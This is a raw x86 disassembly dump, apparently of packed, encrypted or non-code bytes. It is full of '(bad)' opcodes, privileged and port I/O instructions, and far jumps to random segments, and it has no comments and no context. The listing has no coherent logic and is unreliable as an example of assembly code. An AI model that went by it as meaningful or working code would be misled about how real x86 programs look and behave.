  427f32:	dec    edi
  427f33:	bound  ebp,QWORD PTR gs:[ebp-0x5e07684a]
  427f3a:	call   0x3502d910
  427f3f:	sti    
  427f40:	add    eax,DWORD PTR [edi]
  427f42:	xchg   ecx,eax
  427f43:	dec    edx
  427f44:	mov    ds:0xca571379,eax
  427f49:	in     eax,0x37
  427f4b:	inc    ebx
  427f4c:	cmp    dh,dh
  427f4e:	inc    ecx
  427f4f:	leave  
  427f50:	xor    esp,DWORD PTR [ebx+0x5cb08161]
  427f56:	mov    dh,BYTE PTR [edx-0xa8a94ab]
  427f5c:	jb     0x427f29
  427f5e:	pop    edi
  427f5f:	cli    
  427f60:	jnp    0x427fbc
  427f62:	jg     0x427f5c
  427f64:	lods   eax,DWORD PTR ds:[esi]
  427f65:	xor    al,0xd4
  427f67:	and    BYTE PTR [edx],0x51
  427f6a:	(bad)  
  427f6b:	xor    bl,BYTE PTR [ebx+0xbb74ad8]
  427f71:	jmp    0xf08:0x1aa2146f
  427f78:	mov    ah,0xe7
  427f7a:	mov    WORD PTR gs:[eax-0x44],fs
  427f7e:	adc    al,0x90
  427f80:	popa   
  427f81:	sbb    eax,0x71864bd5
  427f86:	adc    edi,eax
  427f88:	mov    ds:0x794041bd,al
  427f8d:	jp     0x427ffa
  427f8f:	stc    
  427f90:	icebp  
  427f91:	xchg   DWORD PTR [ebx],ebx
  427f93:	imul   eax,DWORD PTR [edi+0x6f],0xffffffc0
  427f97:	sub    dl,bl
  427f99:	sub    ecx,DWORD PTR [esi]
  427f9b:	shl    BYTE PTR [esi+edx*2],1
  427f9e:	ins    BYTE PTR es:[edi],dx
  427f9f:	cmc    
  427fa0:	mov    BYTE PTR [ecx+eax*2],ah
  427fa3:	test   BYTE PTR [eax+0x1167b21d],ah
  427fa9:	xlat   BYTE PTR ds:[ebx]
  427faa:	fsubp  st(1),st
  427fac:	or     dh,bl
  427fae:	xchg   ecx,eax
  427faf:	sub    eax,0xaf2c2af
  427fb4:	call   FWORD PTR [esi]
  427fb6:	add    esi,DWORD PTR [edx+0x27bfa8a6]
  427fbc:	call   0xf5d16d66
  427fc1:	ret    0x96be
  427fc4:	inc    esi
  427fc5:	push   es
  427fc6:	and    eax,0x261e4a5d
  427fcb:	mov    al,ds:0x92eb217d
  427fd0:	xchg   esp,eax
  427fd1:	addr16 push esi
  427fd3:	retf   
  427fd4:	dec    edx
  427fd5:	jl     0x428020
  427fd7:	lds    esp,FWORD PTR [ecx-0x404d35c7]
  427fdd:	out    0x48,al
  427fdf:	sar    BYTE PTR [edi+0x44],0xee
  427fe3:	mov    cl,0x10
  427fe5:	mov    ch,0x8a
  427fe7:	test   eax,0x5f37c2db
  427fec:	fild   WORD PTR [ebx]
  427fee:	test   DWORD PTR [edi+edi*8-0x1dbb92f5],ebp
  427ff5:	mov    bh,BYTE PTR [esi+eiz*2]
  427ff8:	dec    esi
  427ff9:	mov    bh,0x8b
  427ffb:	push   edi
  427ffc:	or     al,0xfe
  427ffe:	dec    ebp
  427fff:	mov    ah,0x54
  428001:	jae    0x428075
  428003:	popa   
  428004:	dec    eax
  428005:	dec    ebx
  428006:	fistp  QWORD PTR [ebx+0x4e]
  428009:	retf   0x96f8
  42800c:	jb     0x428070
  42800e:	adc    bl,ah
  428010:	xchg   BYTE PTR [ecx-0x7c],al
  428013:	scas   eax,DWORD PTR es:[edi]
  428014:	stos   BYTE PTR es:[edi],al
  428015:	and    esi,ecx
  428017:	dec    ebx
  428018:	addr16 repnz pop esi
  42801b:	sbb    BYTE PTR [esp+esi*2+0x1bf7746f],dl
  428022:	cmp    eax,0x10aa3a81
  428027:	mov    bl,0xf
  428029:	sub    DWORD PTR [ebx+0x6e41b333],edi
  42802f:	(bad)  
  428030:	mov    eax,ds:0x35747d5c
  428035:	push   ebx
  428036:	shl    bh,0x7e
  428039:	outs   dx,DWORD PTR ds:[esi]
  42803a:	rol    BYTE PTR [edx-0x169b3613],0xd9
  428041:	add    DWORD PTR [ebx-0x533a1a83],ebp
  428047:	jae    0x42800a
  428049:	dec    ebx
  42804a:	pop    es
  42804b:	add    DWORD PTR [eax],edx
  42804d:	vpackssdw xmm1,xmm6,XMMWORD PTR [ecx-0x69]
  428052:	dec    edi
  428053:	test   eax,0xe92a2c92
  428058:	aad    0x2c
  42805a:	jo     0x428004
  42805c:	or     ebx,ebp
  42805e:	sub    al,0x79
  428060:	int3   
  428061:	and    ecx,ecx
  428063:	jb     0x4280d8
  428065:	pop    ebx
  428066:	in     al,dx
  428067:	dec    esp
  428068:	(bad)  
  428069:	retf   0x519d
  42806c:	sbb    bh,BYTE PTR [eax+0x5e]
  42806f:	sahf   
  428070:	fld    DWORD PTR [edi+0x7aeda5c]
  428076:	mov    edi,0xb1f2a89b
  42807b:	sub    DWORD PTR [edi+0x59],edx
  42807e:	mov    ah,0x8a
  428080:	mov    edi,0x289165cb
  428085:	pop    ebp
  428086:	xchg   edx,eax
  428087:	gs xchg edx,eax
  428089:	mov    al,0x35
  42808b:	retf   
  42808c:	inc    edi
  42808d:	inc    ebp
  42808e:	aaa    
  42808f:	lahf   
  428090:	cwde   
  428091:	fs pushf 
  428093:	stc    
  428094:	mov    ds:0x4eae3116,eax
  428099:	dec    edi
  42809a:	(bad)  
  42809b:	fldcw  WORD PTR [ecx+0x3e]
  42809e:	nop
  42809f:	cmp    ebx,0x6feb056
  4280a5:	jmp    0x428049
  4280a7:	je     0x4280c3
  4280a9:	sbb    al,0xb6
  4280ab:	pop    DWORD PTR [eax]
  4280ad:	mov    ebx,esp
  4280af:	lds    ebx,FWORD PTR [ecx+0x763e366c]
  4280b5:	out    0x4d,al
  4280b7:	call   0x257d:0xcd731ec1
  4280be:	outs   dx,DWORD PTR ds:[esi]
  4280bf:	shr    BYTE PTR [edx-0x1a9fcea6],1
  4280c5:	les    esi,FWORD PTR [edi+0x416d971a]
  4280cb:	shl    DWORD PTR [esi+0x15e40811],0x38
  4280d2:	(bad)  
  4280d4:	jg     0x428078
  4280d6:	dec    eax
  4280d7:	add    eax,0x7c434d69
  4280dc:	or     edx,ecx
  4280de:	sahf   
  4280df:	mov    ds:0x3c61f07f,al
  4280e4:	and    eax,0x3983a25e
  4280e9:	pop    edx
  4280ea:	ins    BYTE PTR es:[edi],dx
  4280eb:	dec    ecx
  4280ec:	push   0xa5688066
  4280f1:	xor    dl,BYTE PTR [edx+ebx*8]
  4280f4:	dec    eax
  4280f5:	xor    al,0xbf
  4280f7:	out    dx,al
  4280f8:	and    ecx,DWORD PTR [ebx]
  4280fa:	inc    eax
  4280fb:	adc    dl,BYTE PTR [esi+0x55a5c0]
  428101:	add    BYTE PTR [edx-0x107ddbc],bl
  428107:	(bad)  
  428108:	fisub  DWORD PTR [esi+0x62]
  42810b:	mov    eax,0x1cd67475
  428110:	in     eax,dx
  428111:	push   ebp
  428112:	mov    ah,0xf2
  428114:	add    DWORD PTR [eax],eax
  428116:	add    eax,DWORD PTR es:[eax]
  428119:	add    BYTE PTR [edx-0x16],dh
  42811c:	sub    bl,bl
  42811e:	popf   
  42811f:	dec    edi
  428120:	xchg   esi,eax
  428121:	outs   dx,BYTE PTR ds:[esi]
  428122:	mov    cl,0x53
  428124:	test   eax,0xbb3e306e
  428129:	add    bl,bh
  42812b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42812c:	xor    BYTE PTR [esi+0x38],al
  42812f:	xlat   BYTE PTR ds:[ebx]
  428130:	rcl    BYTE PTR [edi+0x61],1
  428133:	sbb    esp,DWORD PTR [ebx-0x7b]
  428136:	jmp    DWORD PTR [eax]
  428138:	lds    edx,FWORD PTR [eax+edi*8-0x39]
  42813c:	cs int 0x36
  42813f:	jo     0x428131
  428141:	out    0x9e,al
  428143:	push   ds
  428144:	ins    DWORD PTR es:[edi],dx
  428145:	and    dh,al
  428147:	pushf  
  428148:	nop
  428149:	cmp    eax,esi
  42814b:	ret    0x2838
  42814e:	xchg   ebp,eax
  42814f:	inc    edi
  428150:	adc    bl,BYTE PTR [edx-0x38318d79]
  428156:	(bad)  
  428157:	pushf  
  428158:	or     bh,BYTE PTR [eax+0x60]
  42815b:	cmp    al,cl
  42815d:	xchg   edi,eax
  42815e:	jnp    0x42815d
  428160:	outs   dx,DWORD PTR ds:[esi]
  428161:	imul   esp,DWORD PTR [edx+eiz*8+0x59],0x73c57ba3
  428169:	pop    ecx
  42816a:	les    ebp,FWORD PTR [edi-0x2cb961ac]
  428170:	inc    edx
  428171:	mov    ch,0x9f
  428173:	xchg   DWORD PTR [esi-0x60529ebd],edi
  428179:	repz xor eax,0x8c7f13ec
  42817f:	sbb    cl,BYTE PTR [eax-0x71]
  428182:	imul   ecx,DWORD PTR [esi-0x69],0x6
  428186:	ins    DWORD PTR es:[edi],dx
  428187:	pop    ds
  428188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428189:	inc    ebp
  42818a:	jp     0x428114
  42818c:	pop    ecx
  42818d:	sub    al,0xda
  42818f:	xchg   ebp,eax
  428190:	jo     0x4281ba
  428192:	call   0xde05:0xef080647
  428199:	fiadd  WORD PTR [eax+0xfc4a9a]
  42819f:	retf   0xc761
  4281a2:	(bad)  
  4281a3:	and    edx,DWORD PTR [edx+ecx*4]
  4281a6:	fwait
  4281a7:	push   edx
  4281a8:	cdq    
  4281a9:	lods   eax,DWORD PTR ds:[esi]
  4281aa:	pop    edi
  4281ab:	inc    eax
  4281ac:	xchg   ebx,eax
  4281ad:	pop    es
  4281ae:	inc    eax
  4281af:	neg    DWORD PTR ds:0x52cdead8
  4281b5:	test   eax,0xcde5b6b6
  4281ba:	(bad)  
  4281bb:	cli    
  4281bc:	stos   DWORD PTR es:[edi],eax
  4281bd:	mov    dh,0xc7
  4281bf:	or     BYTE PTR [di-0x6a5],0xa4
  4281c5:	jecxz  0x428174
  4281c7:	mov    al,ds:0x9aaa1c00
  4281cc:	fwait
  4281cd:	(bad)  
  4281ce:	mov    cl,0xcc
  4281d0:	loope  0x42817f
  4281d2:	dec    ecx
  4281d3:	ins    BYTE PTR es:[edi],dx
  4281d4:	jl     0x4281ba
  4281d6:	mov    WORD PTR [esi-0x20],?
  4281d9:	(bad)  
  4281da:	mov    dl,0x64
  4281dc:	xchg   esp,eax
  4281dd:	mov    DWORD PTR [eax+0x1e],esp
  4281e0:	pop    edx
  4281e1:	inc    DWORD PTR [esi+0x47]
  4281e4:	or     BYTE PTR [edx],dl
  4281e6:	push   0xfffffff8
  4281e8:	mov    cl,0x41
  4281ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281eb:	rol    BYTE PTR [ebp+0x35],cl
  4281ee:	xor    cl,BYTE PTR [ecx]
  4281f0:	add    BYTE PTR [edi+0x3b],bl
  4281f3:	retf   
  4281f4:	mov    eax,0x31b13e0e
  4281f9:	sbb    cl,BYTE PTR [ebx-0x72a9f487]
  4281ff:	add    al,0xa4
  428201:	mov    eax,ds:0x51fcd8f3
  428206:	test   DWORD PTR [ebx+0x44],edi
  428209:	scas   eax,DWORD PTR es:[edi]
  42820a:	cmp    eax,0x85fe0515
  42820f:	add    esi,ebp
  428211:	pop    ebp
  428212:	inc    ebp
  428213:	(bad)  
  428214:	outs   dx,BYTE PTR ds:[esi]
  428215:	popa   
  428216:	mov    ch,0x21
  428218:	rcr    DWORD PTR [esi+0x2e],cl
  42821b:	sbb    DWORD PTR [eax],ecx
  42821d:	fisub  WORD PTR [esi]
  42821f:	jb     0x428267
  428221:	pop    eax
  428222:	push   edx
  428223:	jns    0x42827b
  428225:	sbb    BYTE PTR [eax-0x5a82fa8e],dh
  42822b:	pusha  
  42822c:	lods   al,BYTE PTR ds:[esi]
  42822d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42822e:	ins    BYTE PTR es:[edi],dx
  42822f:	(bad)  
  428230:	scas   eax,DWORD PTR es:[edi]
  428231:	jno    0x4281ba
  428233:	(bad)
  428236:	dec    edx
  428237:	int    0x61
  428239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42823a:	xchg   edx,eax
  42823b:	push   eax
  42823c:	jecxz  0x42824e
  42823e:	xchg   ecx,eax
  42823f:	adc    ah,cl
  428241:	jmp    0x428250
  428243:	adc    BYTE PTR [ecx+0x1163a2a5],cl
  428249:	mov    eax,ds:0x8fbcf3c2
  42824e:	inc    ebp
  42824f:	inc    esi
  428250:	jnp    0x4282c8
  428252:	mov    WORD PTR [edi+0x1a],es
  428255:	jbe    0x428293
  428257:	(bad)  
  428259:	ins    BYTE PTR es:[edi],dx
  42825a:	and    ecx,eax
  42825c:	mov    gs,WORD PTR [edx]
  42825e:	xor    esp,0x52
  428261:	mov    dh,0xf6
  428263:	sub    al,0xe2
  428265:	mov    edi,DWORD PTR [ebp-0x339bfc3f]
  42826b:	aad    0xa4
  42826d:	out    dx,eax
  42826e:	xor    al,0x79
  428270:	inc    ebx
  428271:	mov    ebp,0xae8721e2
  428276:	ret    0xf6b
  428279:	mov    ebp,0x92eccbc2
  42827e:	jns    0x428255
  428280:	retf   0x6cff
  428283:	mov    ebp,DWORD PTR [edx+0x65fc6ba8]
  428289:	push   ebx
  42828a:	dec    ecx
  42828b:	pop    edx
  42828c:	mov    al,0x84
  42828e:	jne    0x4282c6
  428290:	dec    edi
  428291:	data16 loop 0x42829e
  428294:	mov    gs,WORD PTR [ecx]
  428296:	lds    ecx,FWORD PTR [ebp+0x19]
  428299:	popa   
  42829a:	scas   al,BYTE PTR es:[edi]
  42829b:	pop    esi
  42829c:	scas   al,BYTE PTR es:[edi]
  42829d:	push   es
  42829e:	push   esi
  42829f:	mov    eax,0x6488fc23
  4282a4:	mov    dl,0x5f
  4282a6:	stos   BYTE PTR es:[edi],al
  4282a7:	aad    0x1
  4282a9:	call   0xca47a7e1
  4282ae:	fild   DWORD PTR [ebx-0x44]
  4282b1:	out    dx,eax
  4282b2:	call   0x326ce929
  4282b7:	or     DWORD PTR [ebp+0x751ce72a],eax
  4282bd:	mov    eax,ds:0xf071d257
  4282c2:	sub    eax,0xb9d550b
  4282c7:	out    0x8a,al
  4282c9:	mov    dh,0x73
  4282cb:	push   esp
  4282cc:	add    al,al
  4282ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282cf:	push   ss
  4282d0:	xchg   esi,eax
  4282d1:	aaa    
  4282d2:	jb     0x4282aa
  4282d4:	jo     0x428313
  4282d6:	test   esp,ecx
  4282d8:	dec    edx
  4282d9:	mov    ss,WORD PTR [eax+edx*8+0x22]
  4282dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282de:	int    0x5f
  4282e0:	inc    ebx
  4282e1:	ror    DWORD PTR [ebx+0x630dffce],0x5b
  4282e8:	xchg   ebp,eax
  4282e9:	push   ds
  4282ea:	sub    BYTE PTR ds:0x81597c2a,bh
  4282f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282f1:	add    DWORD PTR [edx],esi
  4282f3:	xlat   BYTE PTR ds:[ebx]
  4282f4:	adc    dl,ah
  4282f6:	push   ds
  4282f7:	jle    0x4282b1
  4282f9:	xchg   ah,al
  4282fb:	cs aaa 
  4282fd:	adc    eax,0xd1ce662d
  428302:	and    eax,0x3a35b4f8
  428307:	dec    esp
  428308:	(bad)  
  428309:	mov    edx,0xe252ea39
  42830e:	(bad)  
  42830f:	xor    eax,0xc23d7311
  428314:	stos   DWORD PTR es:[edi],eax
  428315:	push   es
  428316:	cmp    BYTE PTR [ebp-0x36],dl
  428319:	add    al,BYTE PTR [edi]
  42831b:	inc    ecx
  42831c:	jmp    0xeafb:0xc8cc393e
  428323:	lods   al,BYTE PTR ds:[esi]
  428324:	cmp    eax,0xa44b91cc
  428329:	xchg   edx,eax
  42832a:	xchg   edx,eax
  42832b:	cwde   
  42832c:	push   0x9682bf2c
  428331:	sub    bh,BYTE PTR [edi+eiz*2+0xa]
  428335:	call   0xa0b3:0xe38679f4
  42833c:	xchg   ecx,eax
  42833d:	mov    bh,BYTE PTR [esi]
  42833f:	fucom  st(1)
  428341:	aad    0xcd
  428343:	adc    al,0x29
  428345:	inc    ecx
  428346:	lods   eax,DWORD PTR ds:[esi]
  428347:	in     eax,0x4
  428349:	neg    DWORD PTR [ebp+0x1a03f83f]
  42834f:	and    eax,0x55a5a94
  428354:	es mov edx,0xd2a0a748
  42835a:	sbb    ebx,DWORD PTR [edx+0x7fc4fec6]
  428360:	fs inc esp
  428362:	nop
  428363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428364:	add    edi,edx
  428366:	or     eax,DWORD PTR [edx-0x606399b9]
  42836c:	fiadd  DWORD PTR [ebx+0x7fb57179]
  428372:	pop    edx
  428373:	mov    ecx,0x98983d89
  428378:	cmp    dl,0xb6
  42837b:	push   ecx
  42837c:	lea    esp,[ebp+0x3f0d541b]
  428382:	sub    ebp,edx
  428384:	xor    eax,0x43328bea
  428389:	mov    esp,0x9ebef3de
  42838e:	add    DWORD PTR [esp+ebp*8],ebx
  428391:	mov    al,ds:0x8a17659
  428396:	std    
  428397:	mov    ch,BYTE PTR [eax-0x11]
  42839a:	mov    esp,0x70b5b16f
  42839f:	xor    bh,ch
  4283a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a2:	mov    ebp,0x3d4791bb
  4283a7:	or     cl,BYTE PTR [edx-0x4c]
  4283aa:	jmp    0xc467:0xc6429f98
  4283b1:	jbe    0x42833f
  4283b3:	in     eax,0x8b
  4283b5:	cmp    DWORD PTR [ebx-0x4c3bbeb],0x2d
  4283bc:	rcr    dl,cl
  4283be:	jns    0x428420
  4283c0:	in     eax,dx
  4283c1:	clc    
  4283c2:	or     al,0x13
  4283c4:	xor    BYTE PTR [ecx+0x2c3ec7af],al
  4283ca:	adc    DWORD PTR fs:[esi+edx*8-0x3e],ecx
  4283cf:	sbb    eax,0xcb9a61ea
  4283d4:	(bad)  
  4283d6:	cmc    
  4283d7:	leave  
  4283d8:	push   cs
  4283d9:	imul   esp,edx,0xc2afcc29
  4283df:	xchg   esp,eax
  4283e1:	add    ebp,edx
  4283e3:	icebp  
  4283e4:	outs   dx,BYTE PTR ds:[esi]
  4283e5:	cld    
  4283e6:	outs   dx,BYTE PTR ds:[esi]
  4283e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283e8:	stos   DWORD PTR es:[edi],eax
  4283e9:	and    al,0xf9
  4283eb:	je     0x42846a
  4283ed:	add    DWORD PTR [edi-0x44a94a53],edx
  4283f3:	or     ch,BYTE PTR [edx-0x2c]
  4283f6:	pop    esp
  4283f7:	xchg   esp,eax
  4283f8:	call   0x41cc:0xeaa41d8b
  4283ff:	sub    bh,al
  428401:	ficom  WORD PTR [ebp-0x1f94f649]
  428407:	pushf  
  428408:	rol    esp,0x44
  42840b:	and    dh,0x42
  42840e:	mov    ds:0x120b4ce2,al
  428413:	cmp    ecx,0xffffffa6
  428416:	ret    0xa303
  428419:	pop    eax
  42841a:	aad    0xda
  42841c:	repnz les ebp,FWORD PTR [edi+0x424de677]
  428423:	ret    
  428424:	push   ebp
  428425:	lea    ecx,[esi]
  428427:	mov    dh,0x7e
  428429:	(bad)  
  42842a:	adc    al,0x2c
  42842c:	retf   0x22d3
  42842f:	fst    DWORD PTR [ebx]
  428431:	inc    edx
  428432:	xor    DWORD PTR [eax+0x65],0xffffff80
  428436:	pop    eax
  428437:	jno    0x4283fc
  428439:	hlt    
  42843a:	fnsave [ecx-0x460e025f]
  428440:	add    BYTE PTR [eax],al
  428442:	nop
  428443:	stos   DWORD PTR es:[edi],eax
  428444:	es ret 
  428446:	aas    
  428447:	iret   
  428448:	cmc    
  428449:	sti    
  42844a:	pushf  
  42844b:	ds loop 0x42843a
  42844e:	mov    ecx,0xda7fcf63
  428453:	cmc    
  428454:	add    DWORD PTR [eax],eax
  428456:	add    eax,DWORD PTR es:[eax]
  428459:	add    dl,ch
  42845b:	fucomip st,st(5)
  42845d:	inc    ecx
  42845e:	adc    DWORD PTR [esi],eax
  428460:	push   ebx
  428461:	mov    eax,DWORD PTR [ecx-0x17]
  428464:	ins    BYTE PTR es:[edi],dx
  428465:	pop    ss
  428466:	clts   
  428468:	sar    BYTE PTR [ecx],0xb5
  42846b:	dec    esi
  42846c:	jno    0x428436
  42846e:	or     eax,0x831c494
  428473:	ins    BYTE PTR es:[edi],dx
  428474:	ds in  eax,0x2a
  428477:	push   eax
  428478:	mov    cl,0xf9
  42847a:	sub    al,0x78
  42847c:	xchg   edx,eax
  42847d:	or     eax,0xc93977d4
  428482:	jg     0x42846c
  428484:	sbb    al,0x44
  428486:	pop    esi
  428487:	(bad)  
  428488:	jle    0x428484
  42848a:	rcr    BYTE PTR [esi],1
  42848c:	pop    es
  42848d:	push   ebx
  42848e:	xor    al,0xbf
  428490:	sbb    edx,DWORD PTR [esi-0x4f]
  428493:	sub    eax,0x4a4bb53
  428498:	fisttp DWORD PTR [edx+0x23517c27]
  42849e:	outs   dx,BYTE PTR ds:[esi]
  42849f:	mov    DWORD PTR [edx],ecx
  4284a1:	or     DWORD PTR [edx+0x7],ebp
  4284a4:	jne    0x42846c
  4284a6:	mov    ebx,ecx
  4284a8:	data16 fcmovne st,st(5)
  4284ab:	leave  
  4284ac:	inc    edi
  4284ad:	mov    edi,0x8454a9ba
  4284b2:	cmp    ah,ah
  4284b4:	jns    0x428488
  4284b6:	jle    0x4284c6
  4284b8:	or     edi,esi
  4284ba:	outs   dx,DWORD PTR ds:[esi]
  4284bb:	(bad)  
  4284bc:	neg    DWORD PTR [edi-0x3841abb8]
  4284c2:	(bad)  
  4284c3:	lods   al,BYTE PTR ds:[esi]
  4284c4:	stos   DWORD PTR es:[edi],eax
  4284c5:	loope  0x428496
  4284c7:	fmulp  st(0),st
  4284c9:	out    dx,al
  4284ca:	pushf  
  4284cb:	jg     0x4284d9
  4284cd:	add    ah,BYTE PTR [eax]
  4284cf:	xchg   esi,eax
  4284d0:	mov    ebx,0x70f59e7d
  4284d5:	ja     0x4284ef
  4284d7:	pop    eax
  4284d8:	(bad)  
  4284d9:	jmp    0x5ab567e0
  4284de:	fwait
  4284df:	call   0xf596:0xcdd26b59
  4284e6:	(bad)  
  4284e7:	lock (bad) 
  4284e9:	pop    eax
  4284ea:	sahf   
  4284eb:	retf   
  4284ec:	inc    ebx
  4284ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284ee:	mov    edi,0xc58645ea
  4284f3:	aas    
  4284f4:	pop    ebx
  4284f5:	cmc    
  4284f6:	popf   
  4284f7:	jle    0x42855b
  4284f9:	pop    es
  4284fa:	ja     0x4284d0
  4284fc:	pop    eax
  4284fd:	mov    eax,0x739f38f1
  428502:	mov    ecx,DWORD PTR [eax]
  428504:	icebp  
  428505:	ins    DWORD PTR es:[edi],dx
  428506:	xchg   esi,eax
  428507:	neg    BYTE PTR [edx+0x459f9500]
  42850d:	scas   al,BYTE PTR es:[edi]
  42850e:	popa   
  42850f:	mov    ah,0xdb
  428511:	jne    0x428496
  428513:	push   esi
  428514:	push   ss
  428515:	sbb    cl,BYTE PTR [esi+0x30]
  428518:	shl    BYTE PTR [ecx+0x12],cl
  42851b:	mov    esi,0x67c4ddc3
  428520:	cwde   
  428521:	mov    ch,BYTE PTR [edx+0x59]
  428524:	adc    BYTE PTR [edi+ebx*1+0x72ed14e5],0xda
  42852c:	add    BYTE PTR [ebp+0x7c6e7497],0x99
  428533:	jmp    0xd16f:0xb27d9edd
  42853a:	ja     0x42858d
  42853c:	mov    esp,0xe4ba7f32
  428541:	mov    dh,0xd8
  428543:	lea    edi,[edi]
  428545:	aad    0xa9
  428547:	and    ebp,DWORD PTR [edx+0x2879da68]
  42854d:	push   ebp
  42854e:	or     dh,BYTE PTR [edx+0x2e4f8813]
  428554:	xchg   esi,eax
  428555:	xor    ebx,DWORD PTR [eax]
  428557:	mov    ebx,0x9df4691c
  42855c:	adc    esi,eax
  42855e:	(bad)  
  428560:	xchg   ebp,eax
  428561:	imul   esp,DWORD PTR [ecx],0xa354182a
  428567:	push   esp
  428568:	jno    0x42850f
  42856a:	fadd   DWORD PTR [edx-0x7a]
  42856d:	pop    ebx
  42856e:	adc    BYTE PTR [ebx],dl
  428570:	add    DWORD PTR [esi-0x60],ecx
  428573:	mov    eax,ds:0x473faeb5
  428578:	imul   BYTE PTR [edi]
  42857a:	push   edi
  42857b:	das    
  42857c:	mov    bl,0x9f
  42857e:	or     eax,0x2bfa7adc
  428583:	ds gs push eax
  428586:	mov    ah,0x7b
  428588:	jl     0x4285ae
  42858a:	mov    cl,BYTE PTR [edi+edx*4+0x352da14]
  428591:	xchg   ebx,eax
  428592:	xor    ch,BYTE PTR [edi+0x28]
  428595:	outs   dx,BYTE PTR ds:[esi]
  428596:	es jno 0x428587
  428599:	dec    esi
  42859a:	sbb    ah,0xca
  42859d:	mov    cl,cl
  42859f:	rcl    BYTE PTR [esi-0x21ef050a],cl
  4285a5:	cmp    BYTE PTR [eax],dl
  4285a7:	mov    ds:0x3ee937a6,al
  4285ac:	dec    esp
  4285ad:	jae    0x428556
  4285af:	dec    edx
  4285b0:	adc    dl,BYTE PTR [esp+ebx*4]
  4285b3:	mov    dl,0xcc
  4285b5:	or     DWORD PTR [ecx],ecx
  4285b7:	xor    eax,0xfcd972c5
  4285bc:	(bad)  
  4285bd:	xlat   BYTE PTR ds:[ebx]
  4285be:	lds    ebx,FWORD PTR [ecx+0x15708197]
  4285c4:	(bad)  
  4285c5:	or     edi,esp
  4285c7:	gs test dl,dh
  4285ca:	ins    BYTE PTR es:[edi],dx
  4285cb:	rcl    BYTE PTR [edx+0x2b],cl
  4285ce:	ror    BYTE PTR [ebp-0x6c3f19c0],0xb6
  4285d5:	les    edi,FWORD PTR [esi+0x2074acc7]
  4285db:	adc    eax,0x4ab1ea88
  4285e0:	imul   ebx,DWORD PTR [ebp+0x5b817e6],0x5f52690a
  4285ea:	cmp    edi,esi
  4285ec:	xor    edx,ebx
  4285ee:	push   ebp
  4285ef:	rcr    DWORD PTR [esp+ebp*8],cl
  4285f2:	mov    eax,0x41f8e462
  4285f7:	mov    ebx,0xdcd7a9c4
  4285fc:	lahf   
  4285fd:	or     cl,BYTE PTR [eax+eiz*8]
  428600:	cmc    
  428601:	arpl   WORD PTR [ebx+edi*4+0x4796f78],dx
  428608:	sub    eax,0x470ebf6
  42860d:	inc    ecx
  42860e:	int    0x1b
  428610:	rcl    BYTE PTR [esi+0x12d82cb4],cl
  428616:	add    BYTE PTR [eax],bh
  428618:	push   ecx
  428619:	mov    eax,ds:0xb756fe5e
  42861e:	in     al,0x21
  428620:	test   DWORD PTR [ebx],eax
  428622:	mov    esp,0x8c4e9c33
  428627:	xchg   esp,eax
  428628:	aam    0xee
  42862a:	ror    bh,0x26
  42862d:	sub    dl,al
  42862f:	mov    ah,0xa1
  428631:	pushf  
  428632:	addr16 sti 
  428634:	sub    dl,BYTE PTR [ebp-0x1995f6dc]
  42863a:	loopne 0x4286b1
  42863c:	push   ds
  42863d:	or     BYTE PTR [ecx],ch
  42863f:	lahf   
  428640:	test   BYTE PTR [esi],al
  428642:	adc    dh,ah
  428644:	sbb    al,0xdc
  428646:	cmc    
  428647:	repnz (bad) 
  428649:	aam    0x6c
  42864b:	idiv   DWORD PTR [eax]
  42864d:	adc    al,0x3f
  42864f:	out    0x4,eax
  428651:	aas    
  428652:	mov    esp,0x48e5b62f
  428657:	mov    WORD PTR [esi+esi*1],fs
  42865a:	pop    esi
  42865b:	sbb    DWORD PTR [eax],ebx
  42865d:	and    edx,esp
  42865f:	arpl   si,sp
  428661:	xchg   DWORD PTR [eax+eax*2],esp
  428664:	outs   dx,BYTE PTR gs:[esi]
  428666:	sub    al,0x86
  428668:	stos   BYTE PTR es:[edi],al
  428669:	outs   dx,DWORD PTR ds:[esi]
  42866a:	ret    0x11af
  42866d:	and    BYTE PTR [ecx+eax*8+0xf3b8e24],dh
  428674:	js     0x428662
  428676:	xor    esi,DWORD PTR [ebp-0x3]
  428679:	and    dl,BYTE PTR [eax-0x7da4f8f8]
  42867f:	ret    
  428680:	dec    ebp
  428681:	mov    DWORD PTR [ebx],esp
  428683:	lds    ecx,FWORD PTR [edi]
  428685:	dec    esp
  428686:	add    BYTE PTR [ebx-0x8d75bef],cl
  42868c:	sub    BYTE PTR [esi],0x9e
  42868f:	xor    al,0x8
  428691:	dec    ecx
  428692:	lds    esi,FWORD PTR [esi-0x30]
  428695:	ret    0xc390
  428698:	cmp    DWORD PTR ds:0x960bd25e,esi
  42869e:	jbe    0x42868a
  4286a0:	out    dx,al
  4286a1:	dec    ecx
  4286a2:	test   eax,0xd26aed60
  4286a7:	sbb    esi,eax
  4286a9:	aam    0x31
  4286ab:	mov    esi,0x8bddd944
  4286b0:	xchg   ecx,eax
  4286b1:	xchg   ebx,eax
  4286b2:	xor    bh,BYTE PTR [ebx]
  4286b4:	outs   dx,DWORD PTR ds:[esi]
  4286b5:	xchg   ecx,eax
  4286b6:	fcom   st(2)
  4286b8:	cmp    edx,esp
  4286ba:	push   eax
  4286bb:	xor    esi,DWORD PTR [ebx+edx*2-0x7d8fc7c4]
  4286c2:	dec    ebp
  4286c3:	in     eax,dx
  4286c4:	out    dx,al
  4286c5:	cwde   
  4286c6:	pop    esp
  4286c7:	(bad)  ds:0x39b39d37
  4286cd:	test   al,0x68
  4286cf:	cli    
  4286d0:	sub    dh,BYTE PTR [ebx]
  4286d2:	cmp    DWORD PTR [esi],edi
  4286d4:	stos   DWORD PTR es:[edi],eax
  4286d5:	dec    edi
  4286d6:	and    ch,BYTE PTR [ebx]
  4286d8:	cli    
  4286d9:	inc    edx
  4286da:	jae    0x42870d
